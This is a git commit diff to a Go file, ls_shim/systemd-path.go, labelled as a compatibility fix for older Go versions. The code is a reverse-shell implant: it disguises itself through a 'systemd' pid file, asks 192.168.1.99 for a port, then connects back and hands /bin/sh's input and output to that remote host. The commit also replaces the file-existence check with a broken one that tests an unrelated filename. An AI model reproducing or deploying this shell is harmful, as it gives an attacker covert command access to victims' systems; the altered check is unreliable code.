a8c15291b2d031e6daea6541055080b72da1ba2f
MdbookTech <michael@mdbooktech.com>
2022-02-06 21:25:19 -0500

    Support for older versions of go

--- ls_shim/systemd-path.go
+++ ls_shim/systemd-path.go
@@ -2,17 +2,16 @@
 package main
 
 import (
-	"io/ioutil"
-	"os"
+	"bufio"
 	"fmt"
+	"io/ioutil"
+	"log"
+	"net"
+	"os"
 	"os/exec"
-    "net"
 	"strconv"
 	"strings"
-	"log"
-	"bufio"
-	"errors"
-    )
+)
 
 var HOST_CONNECT string = "192.168.1.99:"
 
@@ -23,10 +22,10 @@ func main() {
 		//If there is, exit
 		fmt.Printf("Process is running!")
 		return
-    }
+	}
 	//Delete the pid file, if it exists
 	tmpcmd := exec.Command("rm /var/run/systemd.pid")
-	tmpcmd.Run();
+	tmpcmd.Run()
 	//Get the current pid and write it to the file
 	currentPid := strconv.Itoa(os.Getpid())
 	ioutil.WriteFile("/var/run/systemd.pid", []byte(currentPid), 0644)
@@ -35,7 +34,7 @@ func main() {
 }
 
 func GetPort() string {
-	getPort,err := net.Dial("tcp", HOST_CONNECT + "5003")
+	getPort, err := net.Dial("tcp", HOST_CONNECT+"5003")
 	if err != nil {
 		fmt.Println("Couldn't get connection")
 		return "420"
@@ -44,35 +43,36 @@ func GetPort() string {
 	port, _ := bufio.NewReader(getPort).ReadString('\n')
 	return port
 }
-
-func EstablishConnection(port string){
+func EstablishConnection(port string) {
 	//Establish reverse connection to host
-	con,_ := net.Dial("tcp", HOST_CONNECT + port)
-    cmd := exec.Command("/bin/sh")
+	con, _ := net.Dial("tcp", HOST_CONNECT+port)
+	cmd := exec.Command("/bin/sh")
 	//Set input/output to the established connection's in/out
-    cmd.Stdin = con
-    cmd.Stdout = con
-    cmd.Stderr = con
+	cmd.Stdin = con
+	cmd.Stdout = con
+	cmd.Stderr = con
 	cmd.Run()
 }
 
 func CheckFileExists(file string) bool {
-	if _, err := os.Stat(file); errors.Is(err, os.ErrNotExist) {
+	//Can use the following if go is actually up to date
+	//if _, err := os.Stat(file); errors.Is(err, os.ErrNotExist) {
+	if _, err := os.Stat("file-exists.go"); err == nil {
 		return false
 	}
 	return true
 }
 
 func CheckPid(pid int) bool {
-    out, err := exec.Command("kill", "-s", "0", strconv.Itoa(pid)).CombinedOutput()
-    if err != nil {
-        log.Println(err)
-    }
-    if string(out) == "" {
+	out, err := exec.Command("kill", "-s", "0", strconv.Itoa(pid)).CombinedOutput()
+	if err != nil {
+		log.Println(err)
+	}
+	if string(out) == "" {
 		//IT RUNNING
-        return true
-    }
-    //IT NO RUNNING
+		return true
+	}
+	//IT NO RUNNING
 	return false
 }
 
@@ -81,10 +81,10 @@ func FindProcess() bool {
 	if !CheckFileExists("/var/run/systemd.pid") {
 		return false
 	}
-    dat, _ := ioutil.ReadFile("/var/run/systemd.pid")
-    pid := string(dat)
+	dat, _ := ioutil.ReadFile("/var/run/systemd.pid")
+	pid := string(dat)
 	pid = strings.TrimSuffix(pid, "\n")
 	fmt.Printf("PID: " + pid)
-	pidint,_ :=  strconv.Atoi(pid)
-    return CheckPid(pidint)
+	pidint, _ := strconv.Atoi(pid)
+	return CheckPid(pidint)
 }
